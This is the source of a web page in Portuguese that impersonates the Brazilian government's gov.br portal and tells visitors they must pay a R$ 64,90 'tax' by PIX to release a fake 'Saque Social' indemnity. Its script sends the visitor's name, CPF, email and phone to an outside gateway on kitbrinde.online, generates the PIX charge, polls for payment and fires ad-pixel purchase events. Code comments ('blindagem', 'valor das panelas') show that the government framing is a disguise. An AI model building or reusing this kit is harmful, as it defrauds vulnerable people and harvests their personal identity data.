    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
    <title>Programa Saque Social - Pagamento</title>
    <link rel="icon" href="images/favic.png" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/all.min.css">
    
    <style>
        :root {
            --gov-blue-primary: #1351B4;
            --gov-blue-secondary: #0F4DA8;
            --gov-blue-light: #E8F4FD;
            --gov-blue-dark: #0C326F;
            --gov-green: #168821;
            --gov-orange: #FF7A00;
            --gov-gray-light: #F8F9FA;
            --gov-gray-medium: #E5E5E5;
            --gov-gray-dark: #495057;
            --gov-white: #FFFFFF;
            --gov-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            --gov-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; overflow-x: hidden; }
        body {
            font-family: 'Inter', 'Source Sans Pro', sans-serif;
            background: linear-gradient(135deg, var(--gov-blue-light) 0%, var(--gov-white) 100%);
            min-height: 100vh; color: var(--gov-gray-dark); line-height: 1.6;
            display: flex; flex-direction: column; -webkit-font-smoothing: antialiased;
        }
        header {
            background: var(--gov-white); padding: 16px 24px;
            display: flex; justify-content: space-between; align-items: center;
            box-shadow: var(--gov-shadow); position: sticky; top: 0; z-index: 1000;
            border-bottom: 3px solid var(--gov-blue-primary);
        }
        header .logo img { height: 40px; width: auto; }
        header .user {
            background-color: #1451b4; color: #fff; border: none;
            border-radius: 50px; padding: 6px 16px; display: flex; align-items: center; cursor: pointer;
        }
        header .user i { margin-right: 8px; }
        nav {
            background: var(--gov-white); padding: 12px 24px;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--gov-gray-medium);
            position: sticky; top: 79px; z-index: 999;
        }
        nav button { background: none; border: none; display: flex; align-items: center; cursor: pointer; }
        nav button p { color: var(--gov-gray-dark); font-size: 14px; margin: 0; }
        nav button span { color: var(--gov-blue-primary); font-weight: 500; }
        #main-content { padding: 24px 24px 40px; max-width: 720px; flex: 1 0 auto; margin: 0 auto; width: 100%; }
        .gov-aviso {
            display: flex; align-items: flex-start; gap: 10px;
            background: #FFFBE6; border: 1px solid #FFD54F;
            border-left: 4px solid #F9A825; border-radius: 8px; padding: 12px 14px;
            margin-bottom: 16px; font-size: 13px; color: #5d4200;
        }
        #pix-section { background: var(--gov-white); border-radius: 8px; box-shadow: var(--gov-shadow-hover); overflow: hidden; }
        .pix-stripe { height: 4px; background: linear-gradient(90deg, var(--gov-blue-primary) 0%, var(--gov-green) 55%, var(--gov-orange) 100%); }
        .pix-loading-overlay { text-align: center; padding: 50px 16px; }
        .pix-big-spin { width: 40px; height: 40px; border: 3px solid transparent; border-top-color: var(--gov-blue-primary); border-right-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; margin: 0 auto; }
        @keyframes pspin { to { transform: rotate(360deg); } }
        .pix-cidadao { display: flex; align-items: center; justify-content: space-between; padding: 12px 18px; border-bottom: 1px solid var(--gov-gray-medium); background: var(--gov-gray-light); }
        .vnum { font-size: 20px; font-weight: 800; color: var(--gov-blue-dark); }
        .pix-body { padding: 18px; }
        .pix-tabs { display: flex; border-radius: 8px; overflow: hidden; border: 1px solid var(--gov-gray-medium); margin-bottom: 16px; }
        .pix-tab { flex: 1; padding: 10px; font-size: 14px; font-weight: 600; text-align: center; cursor: pointer; background: var(--gov-white); border: none; }
        .pix-tab.on { background: var(--gov-blue-primary); color: #fff; }
        .pix-pane { display: none; }
        .pix-pane.on { display: block; }
        .pix-code-box { background: var(--gov-gray-light); border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 12px 14px; font-size: 11.5px; word-break: break-all; margin-bottom: 12px; font-family: monospace; }
        .pix-copy-btn { width: 100%; background: linear-gradient(135deg, #1a9e2a, var(--gov-green)); color: #fff; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .pix-copy-btn.ok { background: #0a5a14; }
        .pix-qr-wrap { text-align: center; padding: 10px 0; }
        .pix-qr-wrap img { max-width: 190px; border: 1px solid #ddd; padding: 10px; border-radius: 8px; }
        .fb-comments-container { background: #fff; padding: 24px; margin-top: 20px; }
        footer { background: #0C326F; color: #fff; text-align: center; padding: 20px; font-size: 13px; }
    </style>
</head>
<body>

<header>
    <div class="logo"><img src="images/govbr.png" style="width:90px;"></div>
    <div class="user">
        <i class="fas fa-user"></i>
        <span id="header-user-name">Usuário</span>
    </div>
</header>

<nav>
    <button><p>Benefício <span> › </span> Indenização <span> › </span> Pagamento</p></button>
</nav>

<main id="main-content">
    <div class="gov-aviso">
        <i class="fas fa-exclamation-triangle"></i>
        <span>Para liberar o seu saque é necessário o recolhimento do imposto. O não pagamento resultará na perda do valor disponível.</span>
    </div>

    <div id="pix-section">
        <div class="pix-stripe"></div>
        <div class="pix-loading-overlay" id="pix-loading">
            <div class="pix-big-spin"></div>
            <p>Gerando seu PIX, aguarde...</p>
        </div>

        <div id="pix-main" style="display:none;">
            <div class="pix-cidadao">
                <div class="pix-cidadao-info">
                    <div class="pix-cidadao-nome" id="pix-nome-show">---</div>
                    <div class="pix-cidadao-cpf" id="pix-cpf-show">---</div>
                </div>
                <div class="pix-cidadao-valor">
                    <div class="vnum" id="pix-valor-topo">R$ 64,90</div>
                </div>
            </div>

            <div class="pix-body">
                <div class="pix-tabs">
                    <button class="pix-tab on" id="ptab-copia" onclick="pixAba('copia')">Copia e Cola</button>
                    <button class="pix-tab" id="ptab-qr" onclick="pixAba('qr')">QR Code</button>
                </div>

                <div class="pix-pane on" id="ppane-copia">
                    <div class="pix-code-box" id="pix-code-box">---</div>
                    <button class="pix-copy-btn" id="pix-copy-btn" onclick="pixCopiar()">COPIAR CÓDIGO PIX</button>
                </div>

                <div class="pix-pane" id="ppane-qr">
                    <div class="pix-qr-wrap" id="pix-qr-img"></div>
                </div>
            </div>
        </div>
    </div>
</main>

<footer>
    <p>© 2026 Governo Federal. Todos os direitos reservados.</p>
</footer>

<script>
    // CONFIGURAÇÃO DE BLINDAGEM - DUTTYFY
    // Aponte para o seu processar.php no domínio kitbrinde.online
    var MEU_PHP_GATEWAY = 'https://kitbrinde.online/tiktokshop/processar.php'; 
    var PIX_VALOR_CENTS   = 6490; // Valor das panelas R$ 64,90
    var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';

    var _pixCode='', _pixTxid='', _pixTimer=null;
    var _p = new URLSearchParams(window.location.search);
    var _nome = (_p.get('nome')||'').trim();
    var _cpf = (_p.get('cpf')||'').replace(/\D/g,'');
    var _email = (_p.get('email')||'cliente@email.com').trim();
    var _fone = (_p.get('telefone')||'11999999999').replace(/\D/g,'');

    // Formatação
    function formatarNome(n){ return n ? n.toLowerCase().replace(/(^\w|\s\w)/g, m => m.toUpperCase()) : 'Cliente'; }
    function formatarCPF(c){ return c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); }

    document.getElementById('header-user-name').textContent = formatarNome(_nome).split(' ')[0];

    // --- Rastreamento Purchase ---
    function trackPurchase() {
        var val = parseFloat((PIX_VALOR_CENTS/100).toFixed(2));
        if(typeof fbq !== 'undefined') fbq('track', 'Purchase', { value: val, currency: 'BRL' });
        if(typeof ttq !== 'undefined') ttq.track('CompletePayment', { value: val, currency: 'BRL' });
    }

    // --- Iniciar PIX ---
    async function pixIniciar(){
        try {
            var utmStr = window.location.search.replace(/^\?/, "");

            var payload = {
                customer: {
                    name: formatarNome(_nome),
                    email: _email,
                    phone: _fone,
                    document: _cpf
                },
                utm: utmStr
            };

            var res = await fetch(MEU_PHP_GATEWAY, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            var data = await res.json();
            if(!data.pixCode) throw new Error();

            _pixCode = data.pixCode;
            _pixTxid = data.transactionId;

            document.getElementById('pix-nome-show').textContent = formatarNome(_nome);
            document.getElementById('pix-cpf-show').textContent = formatarCPF(_cpf);
            document.getElementById('pix-code-box').textContent = _pixCode;

            // Gerar QR Code via API Externa
            document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '">';

            document.getElementById('pix-loading').style.display = 'none';
            document.getElementById('pix-main').style.display = 'block';

            pixPolling();
        } catch(e) {
            alert('Erro ao gerar PIX. Tente novamente.');
        }
    }

    // --- Checagem de Pagamento ---
    function pixPolling(){
        _pixTimer = setInterval(async function(){
            try {
                var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
                var s = await r.json();
                if(s.status === 'COMPLETED') {
                    clearInterval(_pixTimer);
                    trackPurchase();
                    window.location.href = PIX_REDIRECT;
                }
            } catch(e){}
        }, 5000);
    }

    function pixAba(aba){
        document.getElementById('ptab-copia').classList.toggle('on', aba==='copia');
        document.getElementById('ptab-qr').classList.toggle('on', aba==='qr');
        document.getElementById('ppane-copia').classList.toggle('on', aba==='copia');
        document.getElementById('ppane-qr').classList.toggle('on', aba==='qr');
    }

    function pixCopiar(){
        navigator.clipboard.writeText(_pixCode);
        var b = document.getElementById('pix-copy-btn');
        b.textContent = 'COPIADO!';
        b.classList.add('ok');
        setTimeout(() => { b.textContent = 'COPIAR CÓDIGO PIX'; b.classList.remove('ok'); }, 2000);
    }

    pixIniciar();
</script>
</body>
</html>
